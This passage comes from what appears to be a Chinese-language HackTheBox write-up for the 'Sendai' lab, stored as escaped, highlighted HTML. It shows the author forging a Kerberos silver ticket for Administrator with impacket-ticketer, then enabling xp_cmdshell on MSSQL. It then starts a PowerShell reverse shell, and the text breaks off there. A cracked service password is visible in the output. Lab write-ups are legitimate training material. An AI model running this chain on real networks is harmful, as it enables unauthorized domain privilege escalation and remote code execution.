+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:sendai.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:None&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;channel binding:Never&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sendai.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc:SurenessBlob85 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LDAP        10.129.234.66   &lt;span style=&#34;color:#ae81ff&#34;&gt;389&lt;/span&gt;    DC               Domain SID S-1-5-21-3085872742-570972823-736764132
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ echo sid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;S-1-5-21-3085872742-570972823-736764132&amp;gt;&amp;gt;start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ iconv -f ASCII -t UTF-16LE &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; | openssl dgst -md4
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MD4&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;)=&lt;/span&gt; 58655c0b90b2492f84fb46fa78c2d96a
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ echo hash2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;58655c0b90b2492f84fb46fa78c2d96a&amp;gt;&amp;gt;start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;制作票据
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ impacket-ticketer -spn MSSQLSvc/$FQDN -user-id &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt; Administrator -nthash $hash2 -domain-sid $sid -domain $domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Creating basic skeleton ticket and PAC Infos
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; is deprecated and scheduled &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  aTime &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; timegm&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;.timetuple&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Customizing ticket &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; sendai.vl/Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; is deprecated and scheduled &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ticketDuration &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; + datetime.timedelta&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;hours&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;int&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;self.__options.duration&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; is deprecated and scheduled &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  encTicketPart&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;authtime&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; KerberosTime.to_asn1&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; is deprecated and scheduled &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  encTicketPart&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;starttime&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; KerberosTime.to_asn1&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	PAC_LOGON_INFO
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	PAC_CLIENT_INFO_TYPE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	EncTicketPart
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; is deprecated and scheduled &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  encRepPart&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;last-req&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lr-value&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; KerberosTime.to_asn1&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datetime.datetime.utcnow&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	EncTGSRepPart
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Signing/Encrypting final ticket
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	PAC_SERVER_CHECKSUM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	PAC_PRIVSVR_CHECKSUM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	EncTicketPart
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 	EncTGSRepPart
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Saving ticket in Administrator.ccache
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;搞定，利用admin权限访问数据库&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ export KRB5CCNAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrator.ccach
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/sendai&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ proxychains4 impacket-mssqlclient DC.sendai.vl -k -no-pass
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; config file found: /etc/proxychains4.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DLL init: proxychains-ng 4.17
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DLL init: proxychains-ng 4.17
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proxychains&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; DLL init: proxychains-ng 4.17
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Encryption required, switching to TLS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ENVCHANGE&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DATABASE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Old Value: master, New Value: master
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ENVCHANGE&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;LANGUAGE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ENVCHANGE&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;PACKETSIZE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Old Value: 4096, New Value: &lt;span style=&#34;color:#ae81ff&#34;&gt;16192&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DC&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;QLEXPRESS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Line 1: Changed database context to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;master&amp;#39;&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DC&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;QLEXPRESS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Line 1: Changed language setting to us_english.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ACK: Result: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; - Microsoft SQL Server &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt; 7208&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Press help &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; extra shell commands
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是没有xpcmd权限，但是只是没有开启，直接开启即可&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; EXEC sp_configure &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt;,1;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DC&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;QLEXPRESS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Line 185: Configuration option &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt; changed from &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; to 1. Run the RECONFIGURE statement to install.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; RECONFIGURE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; EXEC sp_configure &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt;,1;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DC&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;QLEXPRESS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Line 185: Configuration option &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt; changed from &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; to 1. Run the RECONFIGURE statement to install.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; RECONFIGURE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; EXEC xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;output          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-------------   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sendai&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NULL            
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用powershell反弹shell回来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SENDAI&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; EXEC xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;powershell -e 